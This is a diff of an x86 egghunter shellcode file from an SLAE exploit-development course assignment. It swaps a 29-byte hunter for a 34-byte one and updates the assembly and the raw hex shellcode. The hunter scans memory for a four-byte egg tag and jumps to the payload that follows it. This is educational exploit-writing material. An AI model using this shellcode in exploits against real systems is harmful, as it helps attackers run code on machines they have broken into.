@@ -1,5 +1,5 @@
-;Description:	Assignment #3 (EggHunter, 29 bytes)
-;Shellcode:		\xd9\xee\x9b\xd9\x74\x24\xf4\x58\x40\x81\x78\xf8\xaa\xbb\xcc\xdd\x75\xf6\x81\x78\xfc\xaa\xbb\xcc\xdd\x75\xed\xff\xe0
+;Description:	Assignment #3 (EggHunter, 34 bytes)
+;Shellcode:		\xd9\xee\x9b\xd9\x74\x24\xf4\x58\x40\x31\xdb\xb1\x02\x81\x3c\x18\xaa\xbb\xcc\xdd\x75\xf2\x83\xc3\x04\xfe\xc9\x75\xf0\x8d\x40\x08\xff\xe0
 ;Author: 		Paolo Stivanin <https://github.com/polslinux>
 ;SLAE ID:		526
 
@@ -9,9 +9,16 @@ _start:
 	fldz
 	fstenv [esp-0xc]
 	pop eax
-ll:	inc eax
-	cmp dword [eax-8],0xddccbbaa
-	jne ll
-	cmp dword [eax-4],0xddccbbaa
-	jne ll
+lp1:
+	inc eax
+	xor ebx,ebx
+	mov cl,2
+lp3:
+	cmp dword [eax+ebx],0xddccbbaa
+	jne lp1
+	add ebx,4
+	dec cl
+	jnz lp3
+lp4:
+	lea eax,[eax+8]
 	jmp eax
